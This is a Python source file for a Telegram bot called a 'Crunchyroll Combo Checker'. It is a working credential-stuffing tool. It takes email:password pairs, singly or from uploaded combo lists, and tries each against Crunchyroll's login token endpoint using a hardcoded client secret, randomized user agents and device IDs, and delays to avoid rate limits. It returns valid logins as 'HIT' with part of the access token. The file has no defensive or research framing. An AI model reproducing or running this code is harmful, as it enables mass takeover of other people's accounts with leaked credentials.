import os
import json
import asyncio
import requests
from uuid import uuid4
from user_agent import generate_user_agent
from telegram import Update, Document
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
from telegram.constants import ParseMode

# Crunchyroll Checker Function
def crunchyroll_check(username: str, password: str):
    url = "https://beta-api.crunchyroll.com/auth/v1/token"
    
    headers = {
        "host": "beta-api.crunchyroll.com",
        "content-type": "application/x-www-form-urlencoded",
        "accept-encoding": "gzip",
        "user-agent": generate_user_agent()
    }
    
    data = {
        "grant_type": "password",
        "username": username,
        "password": password,
        "scope": "offline_access",
        "client_id": "y2arvjb0h0rgvtizlovy",
        "client_secret": "JVLvwdIpXvxU-qIBvT1M8oQTr1qlQJX2",
        "device_type": "Redmi",
        "device_id": str(uuid4()),
        "device_name": "Redmi note 8 pro"
    }
    
    try:
        response = requests.post(url, headers=headers, data=data, timeout=25)
        text = response.text

        if response.status_code in (400, 401, 403):
            return "❌ Invalid credentials"

        if "invalid_grant" in text or "invalid_credentials" in text:
            return "❌ Wrong email or password"

        if "too_many_requests" in text:
            return "⏳ Rate limited. Try later"

        if response.status_code == 200 and "access_token" in text:
            result = response.json()
            token = result.get("access_token", "")[:60]
            return f"✅ **HIT**\nEmail: `{username}`\nToken: `{token}...`"

        return "❓ Unknown error"

    except Exception as e:
        return f"⚠️ Error: {str(e)[:100]}"


# Telegram Bot
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "🎉 **Crunchyroll Combo Checker Bot**\n\n"
        "Send a message with: `email:password`\n"
        "Or upload a **.txt** combo list (one combo per line)\n\n"
        "Example combo line:\n"
        "`user@example.com:password123`",
        parse_mode=ParseMode.MARKDOWN
    )


async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = update.message.text.strip() if update.message.text else ""

    if ":" in text and "@" in text:
        try:
            email, password = [x.strip() for x in text.split(":", 1)]
            await update.message.reply_text(f"🔍 Checking: `{email}`", parse_mode=ParseMode.MARKDOWN)
            
            result = crunchyroll_check(email, password)
            await update.message.reply_text(result, parse_mode=ParseMode.MARKDOWN)
        except:
            await update.message.reply_text("❌ Wrong format! Use `email:password`")
    else:
        await update.message.reply_text("Send `email:password` or upload a .txt file")


async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
    document = update.message.document
    
    if not document.file_name.endswith('.txt'):
        await update.message.reply_text("❌ Please upload only **.txt** files")
        return

    await update.message.reply_text("📂 File received. Processing combo list...")

    try:
        file = await context.bot.get_file(document.file_id)
        file_bytes = await file.download_as_bytearray()
        content = file_bytes.decode('utf-8', errors='ignore')

        combos = [line.strip() for line in content.splitlines() if ":" in line and "@" in line]

        if not combos:
            await update.message.reply_text("❌ No valid combos found in the file.")
            return

        await update.message.reply_text(f"✅ Found {len(combos)} combos. Starting check...\nIt may take some time.")

        hits = []
        for i, combo in enumerate(combos, 1):
            if ":" not in combo:
                continue
            email, password = [x.strip() for x in combo.split(":", 1)]
            
            await update.message.reply_text(f"[{i}/{len(combos)}] Checking → {email}", parse_mode=ParseMode.MARKDOWN)
            
            result = crunchyroll_check(email, password)
            
            if "HIT" in result:
                hits.append(combo)
                await update.message.reply_text(result, parse_mode=ParseMode.MARKDOWN)
            
            # Small delay to avoid rate limits
            await asyncio.sleep(1.5)

        # Final summary
        if hits:
            hit_text = "\n".join(hits)
            await update.message.reply_text(
                f"🎯 **CHECK COMPLETE**\n\n"
                f"Total: {len(combos)}\n"
                f"Hits: {len(hits)}\n\n"
                f"**Hits:**\n{hit_text}",
                parse_mode=ParseMode.MARKDOWN
            )
        else:
            await update.message.reply_text("✅ Check finished.\nNo hits found.")

    except Exception as e:
        await update.message.reply_text(f"❌ Error processing file: {str(e)[:200]}")


def main():
    TOKEN = os.getenv("TELEGRAM_BOT_TOKEN")
    if not TOKEN:
        print("❌ TELEGRAM_BOT_TOKEN not found!")
        return

    app = Application.builder().token(TOKEN).build()

    app.add_handler(CommandHandler("start", start))
    app.add_handler(MessageHandler(filters.TEXT & \~filters.COMMAND, handle_message))
    app.add_handler(MessageHandler(filters.Document.ALL, handle_document))

    print("🚀 Crunchyroll Checker Bot is running...")
    app.run_polling()


if __name__ == "__main__":
    main()
